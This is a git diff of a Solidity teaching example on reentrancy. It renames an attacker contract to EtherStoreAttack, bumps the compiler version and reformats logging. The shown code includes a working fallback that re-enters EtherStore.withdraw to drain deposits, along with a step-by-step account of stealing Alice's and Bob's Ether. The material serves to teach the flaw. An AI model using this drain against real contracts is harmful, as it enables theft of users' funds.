@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.10;
+pragma solidity ^0.8.12;
 
 import "../node_modules/hardhat/console.sol";
 
@@ -10,24 +10,24 @@ Let's see why.
 
 1. Deploy EtherStore
 2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
-3. Deploy Attack with address of EtherStore
-4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
+3. Deploy EtherStoreAttack with address of EtherStore
+4. Call EtherStoreAttack.attack sending 1 ether (using Account 3 (Eve)).
    You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
    plus 1 Ether sent from this contract).
 
 What happened?
-Attack was able to call EtherStore.withdraw multiple times before
+EtherStoreAttack was able to call EtherStore.withdraw multiple times before
 EtherStore.withdraw finished executing.
 
 Here is how the functions were called
-- Attack.attack
+- EtherStoreAttack.attack
 - EtherStore.deposit
 - EtherStore.withdraw
-- Attack fallback (receives 1 Ether)
+- EtherStoreAttack fallback (receives 1 Ether)
 - EtherStore.withdraw
-- Attack.fallback (receives 1 Ether)
+- EtherStoreAttack.fallback (receives 1 Ether)
 - EtherStore.withdraw
-- Attack fallback (receives 1 Ether)
+- EtherStoreAttack fallback (receives 1 Ether)
 */
 
 contract EtherStore {
@@ -59,7 +59,7 @@ contract EtherStore {
     }
 }
 
-contract Attack {
+contract EtherStoreAttack {
     EtherStore public etherStore;
 
     constructor(address _etherStoreAddress) {
@@ -74,18 +74,18 @@ contract Attack {
     fallback() external payable {
         if (address(etherStore).balance >= 1 ether) {
             console.log(
-                "Attack.fallback() called: receiving %d from %s",
+                "EtherStoreAttack.fallback() called: receiving %d from %s",
                 msg.value,
                 msg.sender
             );
             console.log(
-                "Attack balance before EtherStore.withdraw() is %d",
+                "EtherStoreAttack balance before EtherStore.withdraw() is %d",
                 address(this).balance
             );
             etherStore.withdraw();
         }
         console.log(
-            "Attack balance after EtherStore.withdraw() is %d",
+            "EtherStoreAttack balance after EtherStore.withdraw() is %d",
             address(this).balance
         );
     }
@@ -93,25 +93,25 @@ contract Attack {
     function attack() external payable {
         require(msg.value >= 1 ether);
         console.log(
-            "Attack.attack(): calling EtherStore.deposit() 1 ether from %s",
+            "EtherStoreAttack.attack(): calling EtherStore.deposit() 1 ether from %s",
             msg.sender
         );
         console.log(
-            "Attack balance before deposit is %d",
+            "EtherStoreAttack balance before deposit is %d",
             address(this).balance
         );
         etherStore.deposit{value: 1 ether}();
         console.log(
-            "Attack balance after deposit is %d",
+            "EtherStoreAttack balance after deposit is %d",
             address(this).balance
         );
         console.log(
-            "Attack.attack(): calling EtherStore.withdraw() from %s",
+            "EtherStoreAttack.attack(): calling EtherStore.withdraw() from %s",
             msg.sender
         );
         etherStore.withdraw();
         console.log(
-            "Attack balance after EtherStore.withdraw() is %d",
+            "EtherStoreAttack balance after EtherStore.withdraw() is %d",
             address(this).balance
         );
     }
@@ -125,8 +125,14 @@ contract Attack {
     // in order to recuperate the ethers used
     function send() external payable {
         uint256 bal = address(this).balance;
-        console.log("Attack balance before recup is %d", address(this).balance);
+        console.log(
+            "EtherStoreAttack balance before recup is %d",
+            address(this).balance
+        );
         (bool sent, ) = msg.sender.call{value: bal}("");
-        console.log("Attack balance after recup is %d", address(this).balance);
+        console.log(
+            "EtherStoreAttack balance after recup is %d",
+            address(this).balance
+        );
     }
 }
